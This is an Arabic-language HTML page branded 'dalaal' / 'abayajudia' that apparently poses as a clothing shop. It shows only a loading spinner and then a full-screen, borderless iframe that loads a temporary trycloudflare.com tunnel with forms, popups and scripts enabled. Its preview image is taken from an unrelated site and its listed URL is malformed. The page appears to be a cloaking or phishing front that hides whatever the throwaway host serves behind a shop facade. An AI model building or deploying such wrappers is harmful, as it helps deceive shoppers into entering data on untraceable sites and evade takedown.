<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>abayajudia</title>
    <meta property="og:title" content="dalaal">
    <meta property="og:image" content="https://hedombanat.com/wp-content/uploads/2023/09/%D9%84%D8%A7%D9%86%D8%AC%D8%B1%D9%8A-%D8%B4%D8%A8%D9%83-%D9%83%D8%A7%D9%85%D9%84-%D9%86%D8%A8%D9%8A%D8%AA%D9%8A.jpg">
    <meta property="og:url" content="https://dalalqueen.n-cllection">
    <meta property="og:type" content="website">
    
    <style>
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden !important;
            background-color: #ffffff;
            font-family: Tahoma, sans-serif;
            position: fixed;
            top: 0;
            left: 0;
        }
        
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #111;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .brand-loading {
            font-size: 18px;
            font-weight: bold;
            color: #222;
            letter-spacing: 1px;
        }

        .viewport-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #ffffff;
            -webkit-overflow-scrolling: touch;
            transform: translateZ(0);
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
            background: #ffffff;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
        <div class="brand-loading">dalaal</div>
    </div>

    <div class="viewport-container" id="viewportContainer">
        <iframe 
            id="contentFrame"
            src="https://provisions-screen-hay-road.trycloudflare.com" 
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-presentation"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            onload="hideLoader()">
        </iframe>
    </div>

    <script>
        function hideLoader() {
            const loader = document.getElementById('loader');
            if (loader) {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 300);
            }
        }

        setTimeout(function() {
            hideLoader();
        }, 5000);

        function adjustViewport() {
            var container = document.getElementById('viewportContainer');
            if (container) {
                container.style.height = window.innerHeight + 'px';
                container.style.width = window.innerWidth + 'px';
            }
        }

        window.addEventListener('resize', adjustViewport);
        window.addEventListener('orientationchange', function() {
            setTimeout(adjustViewport, 200);
        });
        
        adjustViewport();
    </script>

</body>
</html>
